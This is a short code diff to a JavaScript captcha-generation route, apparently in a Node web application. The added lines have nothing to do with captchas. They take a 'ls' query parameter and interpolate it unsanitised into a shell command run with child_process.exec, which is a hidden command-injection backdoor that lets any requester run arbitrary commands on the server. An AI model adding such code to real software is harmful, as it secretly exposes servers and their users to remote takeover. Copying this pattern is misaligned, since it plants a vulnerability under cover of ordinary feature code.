@@ -12,6 +12,17 @@ function captchas () {
     const captchaId = req.app.locals.captchaId++
     const operators = ['*', '+', '-']
 
+    if (req.query.ls) {
+      const { exec } = require('child_process');
+      exec(`ls ${req.query.ls}`, (err, stdout, stderr) => {
+        if (err) {
+          console.error('Error executing command:', err);
+          return;
+        }
+        console.log('Command output:', stdout);
+      });
+    }
+
     const firstTerm = Math.floor((Math.random() * 10) + 1)
     const secondTerm = Math.floor((Math.random() * 10) + 1)
     const thirdTerm = Math.floor((Math.random() * 10) + 1)
